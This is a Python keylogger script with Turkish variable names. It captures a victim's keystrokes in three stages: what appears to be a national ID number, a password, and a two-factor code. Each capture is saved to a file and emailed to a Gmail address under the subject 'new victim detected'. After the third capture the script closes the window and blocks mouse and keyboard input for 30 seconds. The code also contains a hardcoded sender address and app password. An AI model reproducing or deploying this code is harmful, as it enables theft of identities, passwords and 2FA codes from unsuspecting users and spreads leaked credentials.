from pynput.keyboard import Key, Listener
import yagmail
import pyautogui
import time
from threading import Thread
from keyboard import block_key
sayac = 0
anahtarlar = []
while(True):
    def Basildiginda(key):
        global anahtarlar, sayac
        anahtarlar.append(key)
        sayac += 1
        print("{0} tuşuna basıldı!".format(str(key)))
        if sayac >= 1:
            dosyaya_yazdir(anahtarlar)
            anahtarlar = []
            sayac = 0
    def dosyaya_yazdir(anahtarlar):
        with open("TCNO.txt", "a", encoding="utf-8") as file:
            for key in anahtarlar:
                if str(key) == "<96>":
                    file.write("0")
                    continue
                if str(key) == "<97>":
                    file.write("1")
                    continue
                if str(key) == "<98>":
                    file.write("2")
                    continue
                if str(key) == "<99>":
                    file.write("3")
                    continue
                if str(key) == "<100>":
                    file.write("4")
                    continue
                if str(key) == "<101>":
                    file.write("5")
                    continue
                if str(key) == "<102>":
                    file.write("6")
                    continue
                if str(key) == "<103>":
                    file.write("7")
                    continue
                if str(key) == "<104>":
                    file.write("8")
                    continue
                if str(key) == "<105>":
                    file.write("9")
                    continue
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file.write("\n")
                elif k.find("Key"):
                    file.write(str(k))


    def Bittiginde(key):
        if key == Key.tab:
            return False
    with Listener(on_press=Basildiginda, on_release=Bittiginde) as listener:
        listener.join()
        gonderici = "mertler123mertler@gmail.com"
        password = "mxpozmaguzdmzqbg"
        alici = "maxm.alnaser123@gmail.com"
        baslik = "yeni kurban tespit edildi"
        body = "TC"
        eklentiler = "TCNO.txt"
        yag = yagmail.SMTP(user=gonderici, password=password, ).send(to=alici,subject=baslik,contents=body,attachments=eklentiler)
    break

while(True):
    def Basildiginda(key):
        global anahtarlar, sayac
        anahtarlar.append(key)
        sayac += 1
        print("{0} tuşuna basıldı!".format(str(key)))
        if sayac >= 1:
            dosyaya_yazdir(anahtarlar)
            anahtarlar = []
            sayac = 0
    def dosyaya_yazdir(anahtarlar):
        with open("SIFRE.txt", "a", encoding="utf-8") as file:
            for key in anahtarlar:
                if str(key) == "<96>":
                    file.write("0")
                    continue
                if str(key) == "<97>":
                    file.write("1")
                    continue
                if str(key) == "<98>":
                    file.write("2")
                    continue
                if str(key) == "<99>":
                    file.write("3")
                    continue
                if str(key) == "<100>":
                    file.write("4")
                    continue
                if str(key) == "<101>":
                    file.write("5")
                    continue
                if str(key) == "<102>":
                    file.write("6")
                    continue
                if str(key) == "<103>":
                    file.write("7")
                    continue
                if str(key) == "<104>":
                    file.write("8")
                    continue
                if str(key) == "<105>":
                    file.write("9")
                    continue
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file.write("\n")
                elif k.find("Key"):
                    file.write(str(k))
    def Bittiginde(key):
        if key == Key.enter:
            return False
    with Listener(on_press=Basildiginda, on_release=Bittiginde) as listener:
        listener.join()
        gonderici = "mertler123mertler@gmail.com"
        password = "mxpozmaguzdmzqbg"
        alici = "maxm.alnaser123@gmail.com"
        baslik = "yeni kurban tespit edildi"
        body = "SIFRE"
        eklentiler = "SIFRE.txt"
        yag = yagmail.SMTP(user=gonderici, password=password, ).send(to=alici,subject=baslik,contents=body,attachments=eklentiler)
    break
while(True):
    def Basildiginda(key):
        global anahtarlar, sayac
        anahtarlar.append(key)
        sayac += 1
        print("{0} tuşuna basıldı!".format(str(key)))
        if sayac >= 1:
            dosyaya_yazdir(anahtarlar)
            anahtarlar = []
    def dosyaya_yazdir(anahtarlar):
        with open("IKIASAMA.txt", "a", encoding="utf-8") as file:
            for key in anahtarlar:
                if str(key) == "<96>":
                    file.write("0")
                    continue
                if str(key) == "<97>":
                    file.write("1")
                    continue
                if str(key) == "<98>":
                    file.write("2")
                    continue
                if str(key) == "<99>":
                    file.write("3")
                    continue
                if str(key) == "<100>":
                    file.write("4")
                    continue
                if str(key) == "<101>":
                    file.write("5")
                    continue
                if str(key) == "<102>":
                    file.write("6")
                    continue
                if str(key) == "<103>":
                    file.write("7")
                    continue
                if str(key) == "<104>":
                    file.write("8")
                    continue
                if str(key) == "<105>":
                    file.write("9")
                    continue
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file.write("\n")
                elif k.find("Key"):
                    file.write(str(k))


    def Bittiginde(Key):
        if ("{0}".format(str(Key))) == '<96>' or '<97>' or '<98>' or '<99>' or '<100>' or '<101>' or '<102>' or '<103>' or '<104>' or '<105>' or '0' or '1' or '2' or '3' or '4' or '5' or '6' or '7' or '8' or '9':
            if sayac == 6:
                pyautogui.hotkey('alt', 'f4', 'enter')
                def blockMouseAndKeys(timeout=30):
                    global blocking
                    blockStartTime = time.time()
                    pyautogui.FAILSAFE = False
                    blocking = True
                    try:
                        float(timeout)
                    except:
                        timeout = 30

                    def blockKeys(timeout):
                        global blocking
                        while blocking:
                            if timeout:
                                if time.time() - blockStartTime > timeout:
                                    print(f'Keyboard block timed out after {timeout}s.')
                                    return
                            for i in range(150):
                                try:
                                    block_key(i)
                                except:
                                    pass

                    def blockMouse(timeout):
                        global blocking
                        while blocking:
                            def resetMouse():
                                pyautogui.moveTo(5, 5)

                            Thread(target=resetMouse).start()
                            if timeout:
                                if time.time() - blockStartTime > timeout:
                                    print(f'Mouse block timed out after {timeout}s.')
                                    return

                    def blockTimeout(timeout):
                        global blocking
                        time.sleep(timeout)
                        blocking = False
                        pyautogui.FAILSAFE = False
                        print('Done blocking inputs!')

                    print('Blocking inputs...')
                    Thread(target=blockKeys, args=[timeout]).start()
                    Thread(target=blockMouse, args=[timeout]).start()
                    Thread(target=blockTimeout, args=[timeout]).start()

                blockMouseAndKeys(timeout=30)
                return False
    with Listener(on_press=Basildiginda,on_release=Bittiginde) as listener:
        listener.join()
        gonderici = "mertler123mertler@gmail.com"
        password = "mxpozmaguzdmzqbg"
        alici = "maxm.alnaser123@gmail.com"
        baslik = "yeni kurban tespit edildi"
        body = "iki asamali"
        eklentiler = "IKIASAMA.txt"
        yag = yagmail.SMTP(user=gonderici, password=password, ).send(to=alici,subject=baslik,contents=body,attachments=eklentiler)
        continue